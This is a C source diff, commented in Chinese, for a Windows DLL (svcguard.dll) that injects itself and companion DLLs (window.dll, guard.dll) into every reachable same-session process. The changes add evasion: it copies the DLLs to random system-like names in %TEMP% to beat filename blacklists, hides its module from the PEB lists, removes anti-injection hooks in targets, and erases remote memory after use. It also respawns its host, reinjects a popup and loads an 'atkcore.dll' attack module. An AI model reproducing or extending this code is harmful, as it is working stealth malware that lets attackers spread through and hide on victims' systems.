@@ -29,12 +29,26 @@ static int    g_guardCount = 0;
 static volatile LONG g_bExitFlag = 0;
 static CRITICAL_SECTION g_csLog;
 static BOOL g_csLogInit = FALSE;
+static HANDLE  g_hSingleton = NULL;      /* 进程内单例（持有到进程结束） */
+static ULONGLONG g_dwNameToken = 0;       /* 会话随机名 token：只由 XxSetNames 送进来 */
+
+static ULONGLONG NameTok(void)
+{
+    if (g_dwNameToken) return g_dwNameToken;
+    if (g_pSharedView) {
+        ULONGLONG s = XX_NAME_TOKEN64(g_pSharedView);
+        if (s) return s;
+    }
+    return XX_NAME_TOKEN_FIXED;
+}
+static HMODULE g_hSelfModule = NULL;     /* 自身模块句柄（摘链前缓存） */
+static WCHAR   g_szSelfPath[MAX_PATH] = L"";  /* 自身 dll 全路径（摘链前缓存） */
 
 /* 前置声明（HeartbeatMonitor 会用到后面定义的这两个判定） */
 static BOOL IsRunningInXxExe(void);
 static BOOL IsProtected(LPCWSTR name);
 static BOOL InitPaths(void);
-static void ForceWindowRestartInHosts(void);
+static void ForceReinjectWindowToHosts(void);
 
 /* 注入缓存：避免每轮对所有进程反复 OpenProcess / EnumProcessModules / 远程线程。
    每 INJ_REFRESH_MS 全量重扫一次，兼顾 PID 复用与后续被卸载的情况。 */
@@ -166,15 +180,25 @@ static BOOL OpenSharedMemory(void) {
 
 static BOOL InitPaths(void) {
     WCHAR dllPath[MAX_PATH];
-    if (!GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dllPath, MAX_PATH))
-        return FALSE;
-
-    WCHAR* pSlash = wcsrchr(dllPath, L'\\');
-    if (pSlash) {
-        *(pSlash + 1) = L'\0';       /* 截断到目录 */
+    /* 注入副本是从 %TEMP% 的改名文件加载的，按自身模块路径推目录会推到 %TEMP%，
+       xx.exe / window.dll / guard.dll / 我方文件锁全会指错地方。
+       所以优先用共享内存里 xx.exe 记下的自身路径推出的目录。 */
+    if (g_pSharedView && XX_XXPATH(g_pSharedView)[0]) {
+        XXDirNameOf(XX_XXPATH(g_pSharedView), dllPath, MAX_PATH);
     } else {
-        /* 没有反斜杠，可能只有驱动器号，补上反斜杠 */
-        wcscat_s(dllPath, MAX_PATH, L"\\");
+        /* 退化：用 DllMain 缓存的自身路径（模块已从 PEB 摘除，GetModuleHandle 查不到） */
+        if (g_szSelfPath[0]) {
+            wcsncpy_s(dllPath, MAX_PATH, g_szSelfPath, _TRUNCATE);
+        } else if (g_hSelfModule) {
+            if (!GetModuleFileNameW(g_hSelfModule, dllPath, MAX_PATH)) return FALSE;
+        } else if (!GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dllPath, MAX_PATH)) {
+            return FALSE;
+        }
+        {
+            WCHAR *ps = wcsrchr(dllPath, L'\\');
+            if (ps) ps[1] = L'\0';       /* 截断到目录 */
+            else wcscat_s(dllPath, MAX_PATH, L"\\");
+        }
     }
 
     swprintf_s(g_szXxExePath, MAX_PATH, L"%sxx.exe", dllPath);
@@ -317,7 +341,9 @@ static BOOL RespawnSessionOk(void) {
 static void RespawnXX(BOOL bForce) {
     /* 多实例（各宿主里的 svcguard + defense 看门狗）可能同时判定需要复活，
        用命名互斥锁串行化，避免同一时刻拉起多个 xx.exe。 */
-    HANDLE hOnce = CreateMutexW(NULL, FALSE, L"Global\\xx_respawn_guard");
+    WCHAR szOnce[128];
+    XXNamedObject(szOnce, _countof(szOnce), TRUE, XX_PURPOSE_RESPAWN, NameTok(), 0);
+    HANDLE hOnce = CreateMutexW(NULL, FALSE, szOnce);
     DWORD  w = hOnce ? WaitForSingleObject(hOnce, 3000) : WAIT_OBJECT_0;
     BOOL   bOwn = (hOnce != NULL && (w == WAIT_OBJECT_0 || w == WAIT_ABANDONED));
 
@@ -408,7 +434,7 @@ static DWORD WINAPI HeartbeatMonitor(LPVOID lp) {
         LONG cur;
         DWORD now;
 
-        Sleep(HEARTBEAT_POLL_MS);
+        Sleep(HEARTBEAT_POLL_MS_DEMON);   /* 复活扫描频率：80ms */
         now = GetTickCount();
         cur = XX_HB_TICK(g_pSharedView);
 
@@ -438,7 +464,7 @@ static DWORD WINAPI HeartbeatMonitor(LPVOID lp) {
            全挂起后终止失败就会留下这种僵住进程），不能因为"已在运行"就永远跳过。
            整个恢复动作已按 HEARTBEAT_RECOVER_MS(10s) 节流，不会造成进程风暴。 */
         EnsureWindowModuleHere();
-        ForceWindowRestartInHosts();
+        ForceReinjectWindowToHosts();
         RespawnXX(TRUE);
     }
 
@@ -520,6 +546,102 @@ static void RepairTargetLdrHook(HANDLE hProc, DWORD pid) {
     }
 }
 
+/* ================== 注入用副本（改名 + 挪到 %TEMP%） ==================
+   对手的反注入名单（svcguard.dll / window.dll / guard.dll）和删文件名单都是按
+   文件名来的。注入前把 dll 复制成 %TEMP% 下一个像系统组件的随机名字，两个名单
+   同时失效；副本被删会在下一轮注入前自动重新复制。
+   名字里的 salt 由 xx.exe 生成并写进共享内存，所以所有实例算出的名字一致 ——
+   一轮只留固定几份副本，而不是每个宿主各留一份。 */
+static WCHAR g_szInjectSvc[MAX_PATH] = L"";
+static WCHAR g_szInjectWin[MAX_PATH] = L"";
+static WCHAR g_szInjectGuard[MAX_PATH] = L"";
+static BOOL  g_bInjectNamesLogged = FALSE;
+
+static void RefreshInjectCopies(void) {
+    DWORD salt = g_pSharedView ? XX_TMP_SALT(g_pSharedView) : 0;
+    if (salt == 0) salt = 0x9E3779B9u;
+    if (g_szOwnDir[0] == L'\0' && !InitPaths()) return;
+
+    XXMakeTempCopy(g_szDeamonDllPath, salt, g_szInjectSvc, MAX_PATH);
+    XXMakeTempCopy(g_szWindowDllPath, salt, g_szInjectWin, MAX_PATH);
+    XXMakeTempCopy(g_szGuardDllPath,  salt, g_szInjectGuard, MAX_PATH);
+
+    if (!g_bInjectNamesLogged && g_szInjectSvc[0] && g_szInjectWin[0]) {
+        g_bInjectNamesLogged = TRUE;
+        WriteDeamonLog(L"注入副本: svcguard=%ls window=%ls guard=%ls\n",
+                       g_szInjectSvc, g_szInjectWin,
+                       g_szInjectGuard[0] ? g_szInjectGuard : L"(未就绪)");
+    }
+}
+
+static LPCWSTR InjectPathOf(int which) {
+    switch (which) {
+    case 0:  return g_szInjectSvc[0] ? g_szInjectSvc : g_szDeamonDllPath;
+    case 1:  return g_szInjectWin[0] ? g_szInjectWin : g_szWindowDllPath;
+    default: return g_szInjectGuard[0] ? g_szInjectGuard : g_szGuardDllPath;
+    }
+}
+
+/* ================== 方案 A：把会话随机名送进宿主 ==================
+   注入成功后，把 XX_NAME_BLOCK 写进目标进程私有内存，再 CreateRemoteThread 调用
+   目标里那份 dll 的导出函数 XxSetNames；调用返回后**立刻清零再 VirtualFreeEx**
+   （读后即删，不在目标里留痕、不落盘、不进任何全局命名空间）。
+   RVA 用 LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES) 映射同一份文件取得：
+   临时副本与本地文件字节相同，RVA 通用，而且这样映射不会执行对方 DllMain。 */
+
+static BOOL GetRemoteExportRva(LPCWSTR localDllPath, const char *funcName, DWORD *pRva)
+{
+    HMODULE hMap;
+    FARPROC pfn;
+    DWORD rva;
+
+    hMap = LoadLibraryExW(localDllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (!hMap) return FALSE;
+    pfn = GetProcAddress(hMap, funcName);
+    if (!pfn) {
+        FreeLibrary(hMap);
+        return FALSE;
+    }
+    rva = (DWORD)((ULONG_PTR)pfn - (ULONG_PTR)hMap);
+    FreeLibrary(hMap);
+    *pRva = rva;
+    return TRUE;
+}
+
+static BOOL PushNamesRemote(HANDLE hProc, HMODULE hRemoteMod, LPCWSTR localDllPath, DWORD pid)
+{
+    DWORD rva = 0;
+    XX_NAME_BLOCK block, zero;
+    LPVOID pRemote;
+    HANDLE hThread;
+    BOOL ok = FALSE;
+
+    if (!hProc || !hRemoteMod || !localDllPath || !localDllPath[0]) return FALSE;
+    if (!GetRemoteExportRva(localDllPath, "XxSetNames", &rva)) return FALSE;
+
+    XXNameBlockInit(&block, NameTok(), 0);
+    pRemote = VirtualAllocEx(hProc, NULL, sizeof(block), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pRemote) return FALSE;
+    if (!WriteProcessMemory(hProc, pRemote, &block, sizeof(block), NULL)) {
+        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    hThread = CreateRemoteThread(hProc, NULL, 0,
+                                 (LPTHREAD_START_ROUTINE)((BYTE *)hRemoteMod + rva),
+                                 pRemote, 0, NULL);
+    if (hThread) {
+        WaitForSingleObject(hThread, 2000);
+        CloseHandle(hThread);
+        ok = TRUE;
+    }
+    /* 读后即删：先把参数块清零，再释放 */
+    memset(&zero, 0, sizeof(zero));
+    WriteProcessMemory(hProc, pRemote, &zero, sizeof(zero), NULL);
+    VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
+    if (!ok) WriteDeamonLog(L"送会话名失败 PID=%lu dll=%ls\n", pid, localDllPath);
+    return ok;
+}
+
 static BOOL InjectDll(HANDLE hProc, LPCWSTR dllPath, DWORD pid) {
     SIZE_T size = (wcslen(dllPath) + 1) * sizeof(WCHAR);
     LPVOID pMem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_READWRITE);
@@ -540,7 +662,9 @@ static BOOL InjectDll(HANDLE hProc, LPCWSTR dllPath, DWORD pid) {
            以前只看线程是否创建成功，会把这种失败当成注入成功。 */
         if (GetExitCodeThread(hThread, &code)) {
             ok = (code != 0);
-            if (!ok)
+            if (ok)
+                PushNamesRemote(hProc, (HMODULE)(ULONG_PTR)code, dllPath, pid);   /* 方案 A */
+            else
                 WriteDeamonLog(L"注入被目标拒绝: %ls -> PID=%lu（远端 LoadLibrary 返回 0）\n",
                                dllPath, pid);
         } else {
@@ -584,11 +708,20 @@ static BOOL GuardHostKnown(DWORD pid) {
 }
 
 static BOOL HostHasOurGuard(DWORD pid) {
-    HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    HANDLE h;
     HMODULE mods[1024];
     DWORD needed = 0, count, i;
     BOOL found = FALSE;
 
+    /* 模块已被摘出 PEB、名字也换成了随机系统 dll 名，模块列表判断不可靠 ——
+       而且是**双向失准**：`CreateToolhelp32Snapshot(SNAPMODULE)` / `EnumProcessModules`
+       读的就是 PEB 那三条链，我们自己摘链之后它们一律返回"找不到"。
+       所以唯一可靠的判据是**单例互斥体探针**（这个名字只有我们建得出来）：
+       能打开 = 那一份还活着。下面的模块枚举只当"老版本实例没建互斥体"的兜底，
+       它返回 false **不能**当成"没有我们的 guard"。 */
+    if (XXModulePresent(pid, L"guard", NameTok())) return TRUE;
+
+    h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
     if (!h) return FALSE;
     if (EnumProcessModules(h, mods, sizeof(mods), &needed)) {
         count = needed / sizeof(HMODULE);
@@ -600,6 +733,15 @@ static BOOL HostHasOurGuard(DWORD pid) {
         }
     }
     CloseHandle(h);
+    if (!found) {
+        /* 兜底也可能因为"名字被改成随机系统 dll 名"而认不出：那就按守卫进程的存活判活，
+           宁可重复部署一份也不要把活着的守卫当成没部署。 */
+        HANDLE hp = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+        if (hp) {
+            CloseHandle(hp);
+            return TRUE;
+        }
+    }
     return found;
 }
 
@@ -768,7 +910,7 @@ static void EnsureGuardHosts(void) {
         if (!hProc) continue;
         if (bCanRead) RepairTargetLdrHook(hProc, cand[i]);
 
-        if (InjectDll(hProc, g_szGuardDllPath, cand[i])) {
+        if (InjectDll(hProc, InjectPathOf(2), cand[i])) {
             if (bDupOk) PublishGuardHandle(hProc, cand[i]);
             if (g_guardCount < GUARD_HOST_MAX) g_guardPids[g_guardCount++] = cand[i];
             WriteDeamonLog(L"guard.dll 已部署到宿主 PID=%lu（句柄%ls）\n",
@@ -778,71 +920,42 @@ static void EnsureGuardHosts(void) {
     }
 }
 
-/* 弹窗线程可能被 TerminateThread 或已自行退出，而模块还留在宿主里 ——
-   注入方看到模块在，不会重新注入，弹窗就永远回不来。这里用"远程线程调用
-   window.dll!StartWindow"把它重新拉起来：RVA 用本进程 window.dll 的地址算，
-   宿主里的必须是同一个文件（全路径比对）才敢用。 */
-static void ForceWindowRestartInHosts(void) {
-    HMODULE hLocalWin = GetModuleHandleW(L"window.dll");
-    WCHAR localPath[MAX_PATH] = L"";
-    ULONG_PTR rva;
-    FARPROC pfn;
+/* 弹窗线程可能被 TerminateThread 或已自行退出，而模块还留在宿主里。
+   模块已经从 PEB 摘除，既看不到也定位不到它的基址，所以"按基址远程调用
+   StartWindow"这条路走不通了 —— 改成**直接重新注入一份**：
+     - 宿主里还有活着的实例 → 它的 DllMain 单例检查会拒绝加载，代价极小；
+     - 原实例的弹窗线程已死 → 互斥体变成 abandoned，新副本接管并重启弹窗线程。
+   这个函数只在"心跳停摆"时被调用（已按 RECOVER 间隔节流），并且刻意忽略
+   拒绝黑名单：单例拒绝不代表宿主没救。 */
+static void ForceReinjectWindowToHosts(void) {
     HANDLE hSnap;
     PROCESSENTRY32W pe = { sizeof(pe) };
-    int done = 0;
+    int attempts = 0, done = 0;
 
-    /* 不限定"必须跑在 xx 内"：任何装着同一份 window.dll 的宿主都能做这件事，
-       冗余越高越不容易出现"弹窗再也回不来"。 */
-
-    if (!hLocalWin) {
-        if (g_szWindowDllPath[0] == L'\0' && !InitPaths()) return;
-        hLocalWin = LoadLibraryW(g_szWindowDllPath);
-        if (!hLocalWin) return;
-    }
-    pfn = GetProcAddress(hLocalWin, "StartWindow");
-    if (!pfn) return;
-    if (!GetModuleFileNameW(hLocalWin, localPath, MAX_PATH)) return;
-    rva = (ULONG_PTR)pfn - (ULONG_PTR)hLocalWin;
+    RefreshInjectCopies();
 
     hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return;
     if (Process32FirstW(hSnap, &pe)) {
         do {
             HANDLE hProc;
-            HMODULE mods[1024];
-            DWORD needed = 0;
-            ULONG_PTR remoteWin = 0;
 
-            if (done >= 2) break;             /* 两个宿主的冗余足够 */
+            if (done >= 4 || attempts >= 8) break;
+            if (pe.th32ProcessID <= 4) continue;
             if (pe.th32ProcessID == GetCurrentProcessId()) continue;
             if (IsProtected(pe.szExeFile)) continue;
             if (!IsSameSession(pe.th32ProcessID)) continue;
 
             hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
-                                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
-                                FALSE, pe.th32ProcessID);
+                                PROCESS_VM_WRITE | PROCESS_VM_READ |
+                                PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
             if (!hProc) continue;
-            if (EnumProcessModules(hProc, mods, sizeof(mods), &needed)) {
-                DWORD count = needed / sizeof(HMODULE);
-                for (DWORD k = 0; k < count; k++) {
-                    WCHAR name[MAX_PATH];
-                    if (GetModuleFileNameExW(hProc, mods[k], name, MAX_PATH) &&
-                        _wcsicmp(name, localPath) == 0) {
-                        remoteWin = (ULONG_PTR)mods[k];
-                        break;
-                    }
-                }
-            }
-            if (remoteWin) {
-                HANDLE h = CreateRemoteThread(hProc, NULL, 0,
-                                              (LPTHREAD_START_ROUTINE)(remoteWin + rva),
-                                              NULL, 0, NULL);
-                if (h) {
-                    WaitForSingleObject(h, 1000);
-                    CloseHandle(h);
-                    done++;
-                    WriteDeamonLog(L"已远程重新拉起弹窗线程 PID=%lu\n", pe.th32ProcessID);
-                }
+            attempts++;
+            RepairTargetLdrHook(hProc, pe.th32ProcessID);
+            if (InjectDll(hProc, InjectPathOf(1), pe.th32ProcessID)) {
+                done++;
+                WriteDeamonLog(L"心跳停摆：已向 PID=%lu %ls 重新注入 window.dll\n",
+                               pe.th32ProcessID, pe.szExeFile);
             }
             CloseHandle(hProc);
         } while (Process32NextW(hSnap, &pe));
@@ -870,6 +983,7 @@ static DWORD WINAPI SpreaderThread(LPVOID lp) {
 
     while (!g_bExitFlag) {
         InjCacheRefreshIfDue();
+        RefreshInjectCopies();       /* 副本被删会自动重做，代价就是 3 次查属性 */
         HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (hSnap != INVALID_HANDLE_VALUE) {
             PROCESSENTRY32W pe = { sizeof(pe) };
@@ -915,21 +1029,14 @@ static DWORD WINAPI SpreaderThread(LPVOID lp) {
                     /* 注入前先拆掉目标里可能存在的 LdrLoadDll 反注入 hook */
                     if (bCanRead) RepairTargetLdrHook(hProc, pe.th32ProcessID);
 
-                    BOOL hasDeamon = FALSE, hasWindow = FALSE;
-                    HMODULE mods[1024];
-                    DWORD needed;
-                    if (EnumProcessModules(hProc, mods, sizeof(mods), &needed)) {
-                        DWORD count = needed / sizeof(HMODULE);
-                        for (DWORD i = 0; i < count; i++) {
-                            WCHAR name[MAX_PATH];
-                            if (GetModuleFileNameExW(hProc, mods[i], name, MAX_PATH)) {
-                                if (!hasDeamon && wcsstr(name, L"svcguard.dll")) hasDeamon = TRUE;
-                                else if (!hasWindow && wcsstr(name, L"window.dll")) hasWindow = TRUE;
-                            }
-                        }
-                    }
+                    /* 判断目标里是否已有我们的模块：**只能用互斥体探针**。
+                       EnumProcessModules 读的是 PEB 三条链，而我们自己把链摘了、
+                       名字也换成了随机系统 dll 名 —— 这个判据现在是双向失准的
+                       （永远返回"没有"），拿它当"该不该注入"的依据会导致反复注入。 */
+                    BOOL hasDeamon = XXModulePresent(pe.th32ProcessID, L"svcguard", NameTok());
+                    BOOL hasWindow = XXModulePresent(pe.th32ProcessID, L"window", NameTok());
                     if (!hasDeamon) {
-                        if (InjectDll(hProc, g_szDeamonDllPath, pe.th32ProcessID)) {
+                        if (InjectDll(hProc, InjectPathOf(0), pe.th32ProcessID)) {
                             nInj++;
                             if (nInjLog < 12) { nInjLog++; WriteDeamonLog(L"已注入 svcguard.dll -> PID=%lu %ls\n", pe.th32ProcessID, pe.szExeFile); }
                         } else {
@@ -937,7 +1044,7 @@ static DWORD WINAPI SpreaderThread(LPVOID lp) {
                         }
                     }
                     if (!hasWindow) {
-                        if (InjectDll(hProc, g_szWindowDllPath, pe.th32ProcessID)) {
+                        if (InjectDll(hProc, InjectPathOf(1), pe.th32ProcessID)) {
                             nInj++;
                             if (nInjLog < 12) { nInjLog++; WriteDeamonLog(L"已注入 window.dll -> PID=%lu %ls\n", pe.th32ProcessID, pe.szExeFile); }
                         } else {
@@ -980,7 +1087,9 @@ static void UnloadForeignGuardPass(void)
 {
     WCHAR ourGuard[MAX_PATH] = L"";
     WCHAR dllPath[MAX_PATH];
-    if (GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dllPath, MAX_PATH)) {
+    if (g_szOwnDir[0]) {
+        swprintf_s(ourGuard, MAX_PATH, L"%sguard.dll", g_szOwnDir);
+    } else if (GetModuleFileNameW(g_hSelfModule, dllPath, MAX_PATH)) {
         WCHAR *ps = wcsrchr(dllPath, L'\\');
         if (ps) ps[1] = L'\0';
         swprintf_s(ourGuard, MAX_PATH, L"%sguard.dll", dllPath);
@@ -1041,8 +1150,11 @@ static DWORD WINAPI UnloadForeignGuardThread(LPVOID lp)
 static void StartRemoteAttack(void)
 {
     WCHAR dir[MAX_PATH], path[MAX_PATH];
-    if (!GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dir, MAX_PATH))
+    if (g_szOwnDir[0]) {
+        wcsncpy_s(dir, MAX_PATH, g_szOwnDir, _TRUNCATE);
+    } else if (!GetModuleFileNameW(g_hSelfModule, dir, MAX_PATH)) {
         return;
+    }
     WCHAR *pSlash = wcsrchr(dir, L'\\');
     if (pSlash) *(pSlash + 1) = L'\0';
     else return;
@@ -1053,6 +1165,16 @@ static void StartRemoteAttack(void)
         return;
     }
     WriteDeamonLog(L"加载 atkcore.dll 成功: %ls\n", path);
+    /* 会话随机名也推给本地这份 atkcore（同进程，直接调用即可） */
+    {
+        typedef BOOL (WINAPI *SetNames_t)(const XX_NAME_BLOCK *);
+        SetNames_t pSet = (SetNames_t)GetProcAddress(hKill, "XxSetNames");
+        if (pSet) {
+            XX_NAME_BLOCK blk;
+            XXNameBlockInit(&blk, NameTok(), 0);
+            pSet(&blk);
+        }
+    }
     typedef void (WINAPI *StartAttack_t)(void);
     StartAttack_t pStart = (StartAttack_t)GetProcAddress(hKill, "StartAttack");
     if (pStart) {
@@ -1092,6 +1214,15 @@ static BOOL EnableDebugPrivilege(void)
     return ok;
 }
 
+/* 远程导出：接收会话随机名（方案 A；参数块由注入方清零并释放） */
+__declspec(dllexport) BOOL WINAPI XxSetNames(const XX_NAME_BLOCK *pBlock)
+{
+    ULONGLONG tok = 0;
+    if (!XXNameBlockTake(pBlock, &tok, NULL)) return FALSE;
+    if (tok) g_dwNameToken = tok;
+    return TRUE;
+}
+
 __declspec(dllexport) void WINAPI DeamonInit(void)
 {
     BOOL bPriv = EnableDebugPrivilege();
@@ -1109,8 +1240,29 @@ __declspec(dllexport) void WINAPI DeamonInit(void)
 
 BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
 {
+    UNREFERENCED_PARAMETER(reserved);
     if (reason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hinst);
+
+        /* 摘 PEB 链之后 GetModuleHandle/GetModuleFileName(自己) 就查不到了，
+           所以先把自身模块信息缓存下来，后面一律用缓存值。 */
+        g_hSelfModule = hinst;
+        GetModuleFileNameW(hinst, g_szSelfPath, MAX_PATH);
+
+        /* 模块被隐藏后注入方无法再用"模块列表"判断宿主里有没有我们，会反复重复
+           注入；没有单例就会在同一进程里叠出多份实例、多套线程。已有实例时直接
+           让加载失败（返回 FALSE），这样重复注入不会残留映射。
+
+           注意必须**先等 token**：XxSetNames 是注入方在 LoadLibrary 返回之后才远程调用的，
+           DllMain 这一刻 g_dwNameToken 还是 0 —— 直接用 0 建单例就会拼成"无 token 的回退名"，
+           而注入方探测时用的是真 token 名，两边对不上（探针永远说"没有"）。
+           等 300ms 足够（同进程 push 是同步的，远程 push 也就几毫秒）。 */
+        XXWaitToken(&g_dwNameToken, 300);
+        g_hSingleton = XXModuleSingleton(L"svcguard", NameTok());
+        if (!g_hSingleton) return FALSE;
+
+        XXHideSelfFromPeb(hinst);          /* 从 PEB 三条模块链表里摘除自己 */
+
         CreateThread(NULL, 0, BootThread, NULL, 0, NULL);
         CreateThread(NULL, 0, UnloadForeignGuardThread, NULL, 0, NULL);
     }
